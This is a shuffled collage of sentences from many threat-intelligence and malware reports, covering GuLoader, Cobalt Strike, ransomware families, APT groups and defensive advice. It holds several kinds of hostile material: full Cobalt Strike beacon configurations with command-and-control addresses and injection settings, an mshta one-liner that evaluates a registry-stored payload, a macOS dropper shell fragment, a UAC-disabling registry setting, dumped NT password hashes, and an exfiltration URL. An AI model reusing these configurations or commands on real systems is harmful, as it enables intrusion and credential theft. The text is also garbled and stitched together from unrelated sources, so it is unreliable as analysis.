Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes. 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = “0” ConsentPromptBehaviorAdmin The ConsentPromptBehaviorAdmin key has been set to “0”, indicating that the behavior of the consent prompt for actions requiring administrator privileges has been modified.
Implement and enhance network and endpoint event analysis and detection capabilities to identify initial infections, compromised credentials, and the manipulation of endpoint processes and files. 
It is important to note that the AddressOfEntryPoint in the optional header does not match the exported functions DllRegisterServer or DllUnregisterServer and it is necessary to run one of the exported functions to start the malware.
Here’s the latest from our TRU Team… What did we find? GuLoader is a sophisticated malware loader which has heavily abused tax-themed lures in the first half of 2023.
HTTP_NULLHTTP
Figure 4 – VBA macro which runs rundll32.exe to load the malware. 
Ransom Cartel typically gains initial access to an environment via compromised credentials, which is one of the most common vectors for initial access for ransomware operators.
Figure 8.
Figure 7.
Drops ”TS.exe” and executes it with t as an argument The dropped executable (TS.exe) can be executed with one of the following options: t, d t|d options that the executable accepts Option t copies the executable to %appdata%\Packages\TS.exe and registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument. 
72a589da586844d7f0818ce684948eea JA3S: f176ba63b4d68e576b5ba345bec2c7b7 Certificate: [66:f7:4c:f9:56:5d:fe:15:a6:8c:62:b9:3d:72:cb:8e:c9:e9:89:02] Not Before: 2022/05/19 12:22:46 UTC Not After: 2023/05/19 12:22:46 (UTC) Issuer Org: jQuery Subject Common: jquery.com { "beacontype": [ "HTTP" ], "sleeptime": 45000, "jitter": 37, "maxgetsize": 1403644, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 206546002, "cfg_caution": false, "kill_date": null, "server": { "hostname": "59.95.98.204", "port": 8080, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfWiK6EPk2D2Ho7CBgdUfK2kqa/1x2L0Tt0R4Pl/Sof+7skIOqclxG1PeQTbc0VYagoqiuCJCn/QQd8pJBzci5GMTtdrzcKqZXQBy3Rv7Sfv9v8MZQfU2UVrRgVChdAetwPDdSMAa5tsNhEKBDfpbpmhmXsjN10rW6mfPYu+kzuwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/jquery-3.3.1.min.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] } }, "http-post": { "uri": "/jquery-3.3.2.min.js", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\dllhost.exe", "spawnto_x64": "%windir%\\sysnative\\dllhost.exe" }, "process-inject": { "allocator": "NtMapViewOfSection", "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 17500, "startrwx": false, "stub": "yl5rgAigihmtjA5iEHURzg==", "transform-x86": [ "prepend '\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Atera and Splashtop Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.
G0079 DarkHydrus
Although Gh0st RAT was first identified in reports of threat activity almost 15 years ago, it is still actively distributed today.
Aside from the logging connection to host 3, all other connections are forced through Host 1. 
Obtain Capabilities: Tool T1588.002 The team used the following tools: Cobalt Strike and Merlin payloads for C2. KeeThief to obtain a decryption key from a KeePass database Rubeus and DFSCoerce in an NTLM relay attack Initial Access Technique Title ID Use Phishing: Spearphishing Link T1566.002 
The data is effectively stored in the first container file for the registry transaction log: C:\Users\Default\NTUSER.DAT<GUID>.TMContainer00000000000000000001.regtrans-ms. 
It proceeds to copy the “Cookies” file to a temporary file “chromedb_tmp”, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the “cookies.txt” file.
C0032 C0032
S0443 MESSAGETAP
[DS0029]. Ingress Tool Transfer T1105 
In addition to these findings, we’re sharing new indicators of compromise (IOCs) and recommendations to help defenders protect devices and networks against this threat. 
In addition to the above cluster, we detected two servers related to Microcin’s activity on the same network: Domain IP ASN m.necemarket[.]com 172.105.94[.]67 AS63949 – LINODE holdmem.dbhubspi[.]com 5.188.93[.]132 AS202422 – G-Core Labs Who is behind the MoonBounce attack? 
By inspecting the last two characters, we can see that the string is in reverse order. 
Attempt to stop a predefined list of services, using net.exe stop. 
If ransomware execution fails because the correct arguments are not supplied, the wave 2 sample displays a different message from that of wave 1; the wave 2 message resembles an error message displayed by a PDF to DOC converter. 
Initial Version This product is provided subject to this Notification and this Privacy & Use policy. 
The meeting invite took them to a red team-controlled domain [T1566.002] with a button, which, when clicked, downloaded a “malicious” ISO file [T1204].
BTC Payment / Blockchain Status As the time of writing, the BTC address associated with CatB ransomware have zero transactions and a zero balance. 
Event 7045A service was installed in the system.
Ransom Cartel ransom note shown on the left, compared to a ransom note sent by REvil shown on the right.
PythonThe Dolphin loader a uses Python script. 
The ransomware has also been used in conjunction with some well-documented high-end cybercriminal groups.
powershell -c "get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_<REDACTED>.txt" Executing this query would return all events in the Security log that references the specified account and with a source network address.
Threat actors used PTH to acquire a session with elevated user access.
Once the encrypted shellcode has been copied to executable memory, it will then use advapi32.CryptEncrypt to decrypt the shellcode.
With many other event management solutions with SIEMs, used in conjunction with other network security solutions, it becomes a challenge for administrators to distinguish malicious use of legitimate tools and services from lateral movement.
Name="<GUID1>"|__EventFilter.Name="<GUID2>" Table 1.
We believe this lure document is one of the approaches used by the threat actors to compromise their targets. 
Additionally, it’s important to note that the usage of Ngrok in conjunction with MaccaroniC2 tool may result in the violation of the terms of service or policies of certain platforms.
To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed. Avira or Avast installed:
June 8, 2022:
Indicators Supply Chain/Trojanized Nullsoft Installer/SmartPSS MD5:
Links Work and inspiration from others, thanks for that: 
Once started, the application halts immediately, allowing us to attach the debugger to it.
Compromise chain from the Royal Road document to FlowCloud FlowCloud FlowCloud is a complex implant written in C++.
This parses command-line options (updating global variables is relevant), and performs various other initializations, such as invoking a function named sodium_init (likely to initialize the commonly used Sodium crypto library).
It was the use of the name NetWalker, in combination with a strong ransomware connection, that sparked our interest. 
Malware like GoBruteforcer takes advantage of weak (or default) passwords. 
TA0008 Lateral Movement T1021.001.
Next, it loads this entire file to memory and starts its parsing task. 
Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques. 
Do not reuse passwords for multiple accounts. 
Wireshark:
Then at line 7 and 8 the first function argument is dereferenced at offset 0x8 from the this pointer and moved into RCX. 
G0059 Magic Hound
Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes. 
To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/FAQ""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/bg"Port 80:"Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/r-arrow""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/bg" Machine beaconing out to Cobalt Strike using the above profile Persistence An account named “nuuser” was created by one of the Cobalt Strike Beacons.
-d C:\Windows\System32\rundll32.exe “C:\Windows\perfc.dat”,#1 18 “<additional creds for arguments>”” -accepteula → This suppresses the display of the license dialog -s
Spearphishing Link Winnti sends phishing messages with malicious links Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Winnti uses cmd.exe and .bat files to run commands T1059.005 Command and Scripting Interpreter: Visual Basic Winnti uses VBS files to pass control to subsequent malware stages T1059.007 Command and Scripting Interpreter: JavaScript/JScript Winnti uses malicious JScript code in intermediate stages and for the payload T1203 Exploitation for Client Execution Winnti exploits RCE in a CHM file by means of an ActiveX object T1106 Native API Winnti uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process T1204.002 User Execution: Malicious File Winnti tries to make users run malicious .lnk, .chm, and .exe files Persistence T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Winnti persists by means of a registry run key or a startup folder T1543.003 Create or Modify System Process:
For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/. Trademark Recognition MITRE and ATT&CK are registered trademarks of The MITRE Corporation.
The resulting contents are then written to a randomly named .tmp file in the %TEMP% folder. 
The FileData member of the FileDataStoreObject is the key member that holds the embedded data in the OneNote document.
Fortinet Protection FortiGuard AntiVirus detects the malicious files identified in this report with the following signatures: JS/Agent.7593!tr JS/Agent.
The sample’s command and control (C2) server is also located on the CHINANET Jiangsu province network in the city of Nanjing. 
A new file is then created in C:\%USERPROFILE%\AppData\Local\ with a folder that also consists of random characters. 
Neither of these incidents were widely reported in either Mexican or Brazilian media.
Lumma Stealer Composition With the Lumma Stealer malware hash in hand, we visited Malware Bazaar and Triage, where malware samples can be downloaded.
Aside from ensuring full coverage of your endpoint agent, special care should be taken to segment domain admin accounts from workstation admin accounts to reduce the impact of credential dumping when it does occur.
Instruction in the file readme.txt" the only files still accessible to the user are the "readme" files. 
While the BLUELIGHT backdoor performs basic reconnaissance and evaluation of the compromised machine after exploitation, Dolphin is more sophisticated and manually deployed only against selected victims.
Malware using the AtomBombing technique first writes the payload into the global atom table, which can be accessed by all processes.
title: SeroXen RAT for sale url: https://www.cybersecurity-insiders.com/seroxen-rat-for-sale/ This blog was jointly written with Alejandro Prada and Ofer Caspi. 
Realtime monitoring Script scanning Controlled folder access protection PUA protection Scheduled scan Sets Network Protection to audit mode in Windows Defender (allows users to visit known malicious sites but logs them in the event log) 
Ransomware Targeting Linux Machines The “script_linux.sh” script is designed to facilitate the execution of a ransomware payload “164f8295_linux.elf“.
Bitter APT is a South Asian threat group that commonly targets energy and government sectors; they have been known to target Pakistan, China, Bangladesh, and Saudi Arabia. 
Same as Bootstrap. 
[T1021.001] Remote Services: SSH [T1021.004] Taint Shared Content [T1080] Replication Through
This process can be summarized as Exe -> Resources -> BMP with embedded data in pixels fetched and decrypted by, e.g. a DLL -> Payload), etc.
In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI. 
Use network allow and blocklists to block traffic to known anonymity networks and C2 infrastructure. 
Registry Key Sets: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable 1 HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer %HTTP_PROXY%:8080 Reads browser cookies and saves this path: C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\ymgarh1v.defaul t\cookies.sqlite Connects to the server without a hostname. 
POST <C&C address + port>/status.php?r=<epoch timestamp><random 16-bit int> HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-usUser-Agent: <return value of ObtainUserAgentString OR "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko">Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: <C&C url>Content-Length: <content length>
This functionality appeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesn’t exist on the victim’s computer Missing variable initialization – some variables are assumed to be zero-initialized, or dereferenced as pointers without initialization Missing extension filtering The code is heavily based on Microsoft’s Portable Devices COM API code sample. 
Unlike the Windows version, it does have the following components: The Virtual File System (plugins and configurations are stored in separate files) 
Once the malware was executed, the parent instance of explorer launched MSHTA with the following command: "C:\Windows\System32\mshta.exe" "about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\\\ActiveDevice'));if(!window.flag)close()</script>" This oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive.
[Recon Commands] (T1204) WINDOWS METHODOLOGY
In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.
Deploying malicious OAuth application Once the threat actor gained access to privileged users, their next step was to set up the malicious application.
MetaDataTables PeNet.
In the following sections, we describe the various droppers we have seen. 
They then repeated the install of the remote access software package. 
2.
Data gathered by the trojan is then extracted to an attacker-controlled server, researchers added.
See Using Caution with Email Attachments. 
"tasklist.exe /SVC >>
Since Cobalt Strike is widely used by a range of actors, its lack of exclusivity makes attribution harder. 
Figure 1: MOVEit user deletion command Delete FROM users WHERE RealName='Health Check Service' X-siLock-Step2 and X-siLock-Step3 Command Sequence If the value of header field X-siLock-Step1 is neither -1 or -2, the malware parses the values from header fields X-siLock-Step2 and X-siLock-Step3 and stores them in variables named fileid and folderid, respectively. 
S0108 netsh
(hardcoded into Havoc) 3. Agent ID 4. Command ID: 0x63 (DEMON_INITIALIZE) 5. 32-byte AES key 6. 16-byte AES IV 7. AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, "ukrtatnafta[.]org", is specified for this sample.
Fig 8.
"Domain controllers" A ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted. 
While interacting with Workstation 4, the team found an open SSH socket file and a corresponding netstat connection to a host that the team identified as a bastion host from architecture documentation found on Workstation 4.
Remcos is a commercially available tool marketed as a legitimate Remote Administration Tool (RAT).
It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.
The shellcode loader used XOR with a 26 byte keyset and started a long sleep after finishing shellcode execution. Figure 10.
>/dev/null 2>&1 ; pwd -P );BLOB_PATH="/tmp/._KbmflZqwXa";IMG_SP_PATH="/tmp/._bHOospjBUL";[ -f "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";[ -d "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";TMPDIR="$IMG_SP_PATH/Logic Pro X.app/Contents";mkdir -p
The use of shellcode, encoding, compression, obfuscated strings, process injection, hashing algorithms, domain fronting, different communication channels, and dynamically loaded libraries all give malware and network defenses a run for their money. 
Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack. 
[MITRE ATT&CK] Hardware Additions (T1200) Beware Of Fake "Shipping Docs"
DNS Signatures detect the known command and control (C2) domains, which are also categorized as malware in URL Filtering. Indicators of compromise and BlackCat-associated TTPs can be found in the BlackCat ATOM. 
Outlook and Implications 
Once the executable starts running, it side-loads the malicious DLL that decodes and drops three files to the %temp% folder: 
Mandatory password changes enabled Consider only requiring changes for memorized passwords in the event of compromise.
The exec call will execute the binary and modify the process name to the mdworker_shared file path.
Watch.targets" copy /Y
NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: 
In Figure 9 above, the function we’ve renamed as func_ScanScreen() is the one responsible for this screen capture capability.
TA0003 Persistence T1546.008.
TA551 has used multiple malware types, with recent payloads including IcedID, SVCReady, and Ursnif.
* condition: selection AND command_line_filter falsepositives: - Penetration testing level: high tags: - attack.credential access #TA0006 - attack.
Security teams and individual users are advised to continuously update the security solutions of their systems and remain vigilant against threat actors who perform social engineering via job opportunity or salary increase-related lures. 
S0109 WEBC2
820AD7E30B4C54692D07B29361AECD0BB14DF3BEfantasy45.exeMSIL/KillDisk.
By leveraging the Rust programming language, the malware authors are able to easily compile it against various operating system architectures, which facilitates the group’s ability to pivot from one victim to the next.
It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently. 
McAfee Advanced Threat Research (ATR) discovered a large sum of bitcoins linked to NetWalker which suggest its extortion efforts are effective and that many victims have had no option other than to succumb to its criminal demands.
if [ ! -n
The number of blocks, specified at offset 16, must be between 2 and 5.
C369E1466F66744AA0E658588E7CF2C051EE842Fqrt.dllWin32/Injector.
Start your 15-day free trial today. 
Committees include Education and Judicial, International and Foreign Affairs, Defense, and Intelligence.
This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better. 
Yet another approach is to dump the LSASS process memory using process dumping tools, exfiltrate the dump and extract the credentials offline.
UWRFlowCloud v5.0.3 initial loader. 
This means that newer infections will not occur.
website_battlestategames.pngFigure 36.
This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an application/x-www-form-urlencoded message.
Suspicious inbound connector and transport rule created to remove sender email headers – This alert is generated when a suspicious inbound connector and transport rule is created to remove headers that identify the true source address of sender.
Network discovery and lateral movement 
We continue to urge customers to: Isolate and investigate devices where these malicious binaries have been detected Identify accounts that have been used on the affected device and consider them compromised Investigate how those endpoints might have been compromised Investigate the timeline of device compromise for indications of lateral movement Hardening networks by reducing attack surfaces and building strong preventative protection are baseline requirements for defending organizations.
A service was installed in the system (powershell) 5008357 [WINDOWS-SECURITY]
During Phase II, the team enumerated the AD for current session information from every domain computer (Workstation and Server). 
Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes. 
It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached. 
A unique victim ID is then generated from the victim’s CPUID, username, and IP address.
But even with the simple encoding function used in the toy example, care should be taken to ensure that the allowed size of the message we hash is bounded.
The malware then copies itself to the zip file with the name [16 random characters].zip in c:\users\public\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\users\public\pMiOxI3G44Igrpq7.zip\. Both the file inside the zip and the unzipped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe. 
As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.
The injection is also visible from memory dumps.
Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.
C:\ProgramData\WindNT\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\ProgramData\psh\console.exe.
Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
Generate the payload decryption key.
According to analysis of ransomware leak sites, Unit 42 has identified Vice Society as being in the top 10 of the most impactful ransomware gangs of 2022.
G0040 Patchwork
Neither of these domains are used within the file, and at the time of this report have no relations on VirusTotal.
Jumps between instructions occur by means of calls to a special function (rel_jmp), which emulates the jmp command.
[*] File or folder access denied! 
The goal is to create and deliver the first payload to the target according to the environment. 
Contents of video.rarThe executable files are self-contained loaders of Cobalt Strike Beacon PL shellcode with a similar configuration and the same C2 server. 
[T1136], Account Manipulation [T1098], Local Account [T1136.001], File Deletion
When comparing IsaacWiper to WhisperKill, the attackers’ priorities become clear.
S1028 Action RAT
“When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance,” researchers said in a blog post.
<base_dir> is randomly selected from %PROGRAMDATA% %PUBLIC% %APPDATA%\Microsoft %APPDATA%\Microsoft\Windows %LOCALAPPDATA% %LOCALAPPDATA%\Microsoft %LOCALAPPDATA%\Microsoft\Windows <inf_name> and <dll_name> are randomly selected from existing filenames (without extension) in %windir%\inf\*.inf and %windir%\system32\*.dll. 
Most of the companies are Japanese companies, indicating the actor has a keen interest in Japanese markets. 
Successfully Calling WinExec 
FOCUSFJORD Trojan.Win32.DllHijack.
The extracted credentials are sent to the NotPetya process via the named pipe. 
Using Rita, we can identify malicious C2 traffic based on multiple variables, including communication frequency, average bytes sent/received, number of connections etc.
Threat analytics report on the Solorigate attack Advanced hunting Microsoft 365 Defender and Microsoft Defender for Endpoint customers can run advanced hunting queries to hunt for similar TTPs used in this attack. 
Instead, they searched through SBS 1 architecture diagrams and documentation on Workstation 4.
Recent trends have shown that operators are redeploying malware for a variety of distributions and objectives, modifying existing botnets to scale operations and add as many devices as possible to their infrastructure. 
For a more complete description of this version, refer to this 2018 article by Zscaler. 
It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\HARDWARE\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}.
CISA also observed a DNS query for us‐nation‐ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server. 
droppers The dropper contains code that is not executed.
Table 1 provides details on these tactics and techniques.
This unpacks an HTML help file to the folder C:\Users\Public for launching the next stage of the infection: the file resume.exe, which is also embedded inside the CHM file. 
Figure 4.
A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl:
Text files with the name RECOVER-[RANDOM]-FILES.txt (where [RANDOM] refers to the aforementioned file extension name) will be found on the compromised system containing information and instructions such as those in the example below: Figure 4.
The shellcode is then executed in a new thread. 
<%@Page
Deep dive into GuLoader’s custom Vectored Exception Handler. 
Decompressing malware with the installed WinRAR binary Although we found several logs involving multiple pieces of dropped malware, we only managed to retrieve a few of them.
Based on URL tags, we can see that this Trojan is also bundled, downloaded or dropped by other malware like Amadey or SmokeLoader. 
REFERENCES Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts. 
If no such value exists, the key string is "test".
The threat actors claimed the Global Administrator permission through Azure Privileged Identity Management (PIM) and elevated access to get permissions to the target’s management groups and Azure subscriptions.
SysUpdate samples for Linux While investigating SysUpdate’s infrastructure, we found some ELF files linked to some C&C servers.
BinDiff comparison between a FatalRAT sample analyzed by AT&T and the FatalRAT sample found in this campaign Previous version We found a previous version of the malicious installer that the attackers have used since at least May 2022.
Collected information is sent to the main module of the backdoor (using pipe message 0x10000013). 
To combat this, organisations need to ensure they have extensive VPN logging capabilities, robust helpdesk ticketing as well as methods to help identify anomalies in VPN access. 
samoloangu[.]com project ID: 3971099397 IcedID Bot Configuration: 
This server was previously linked to FlowCloud (FlowingFrog).
Performance: Nuitka Compiler aims to generate highly optimized C/C++ code, which can result in improved performance compared to interpreted Python code.
The data above is available via our services.
For this purpose, the script creates the folder “C:Windows System32”, with a space after Windows and deletes it as soon as the utility is running.
The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php. 
| 80AE80001D00000000010000000000000000760000008000098620060600B4E5C6EB -> Generate AC80128000AA5EA486052A8886DE06050A03A4B8009000 -> Generated ARQC[END GHOST] 
More in-depth analysis of this technique was described here. 
S0645 Wevtutil
APT41 is also known to target telecommunication providers. 
But how simple is it to calculate? 
Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe.
Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate threat activity on your network: DEV-1061 threat activity group detected An active ‘PrivateLoader’ malware process was detected while executing ‘Morila’ malware was prevented ‘Multiverze’ malware was detected Microsoft Defender for Endpoint also has detections for the following vulnerabilities exploited by Zerobot: CVE-2022-22965 (Spring4Shell) Microsoft Defender for Endpoint’s Device Discovery capabilities discover and classify devices.
The decryption procedure: Is obfuscated with FinSpy Mutator Involves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager Is different in every backdoored installer. 
After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.
[D3-PMAD] 
This is the same URI structure (/botpack.dat) that the Lite Loader used to download the bot and DLL loader from the C2 in November 2022 when it was dropped via Emotet infections. 
Figure 5.
The Master File Table (MFT) is exclusive to NTFS file systems, contains the physical location of files in the drive as well as logical and physical size and any associated metadata.
Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as CVE-2017-11882.
Figure 2: SmartPSS download page Phase 2: Nullsoft Installer 
The APT group utilizes spear-phishing techniques to obtain initial access, employing a combination of outdated Microsoft Office document vulnerabilities, novel evasion techniques, and highly potent backdoor malware.
Phantom domainIn this attack, the threat actor sets up numerous phantom domain names and requests the target DNS server to resolve them.
It is frequently used by cybercriminals as a ‘quick solution’ in lieu of implementing something more bespoke. 
This beacon is now responsible for decoding the configuration. 
Then Fantasy sleeps for two minutes before overwriting the system’s Master Boot Record. 
The operations described in that blogpost are connected to an APT group active since at least April 2018.
Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze. 
[1] https://securitynews.sonicwall.com/xmlpost/guloader-a-fileless-shellcode-based-malware-in-action/ [2] https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling [3] https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record 
Wrapping Advanced Port Scanner in Inno Setup adds an additional layer of obfuscation to the code, and it is likely to evade static signature detection, forcing dynamic analysis to determine functionality rather than relying on traditional static code signatures. 
Using malware implants that use the Dropbox:registered: API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive:registered: API. 
We can choose also how many days the file be stored. 
BlackCat can stop backup services.
https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rdp-security-explained/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cybercriminals-actively-exploiting-rdp-to-target-remote-organizations/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ens-10-7-rolls-back-the-curtain-on-ransomware/ Exploitation Stage Defensive Overview 
Table 9.
G0065 Leviathan
T1041 Exfiltration over C2 Channel MEGASync is the leading way for LockBit 2.0 affiliates to exfiltrate data from clients with it being occasionally replaced by RClone. TA0011 Command and Control T1219
DelphiTrojanBanking-10003087-0Win.
Unfortunately, no software publisher is immune to being compromised and inadvertently distributing trojanized versions of their applications. 
Identity and Access Management Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies. 
"C: & cd \ & type $temp\a.bat cmd /C
In order to respond and halt the ransomware, each host must be physically visited for shutdown.
Internal Wiki Access Across multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims’ internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics.
But the code contains a full-fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration. 
Unlike other ransomware cases, the threat actor did not hide behind any alias and appears to have no affiliation to any of the known ransomware groups.
Consider using “honeypot” service principal names (SPNs) to detect attempts to crack account hashes
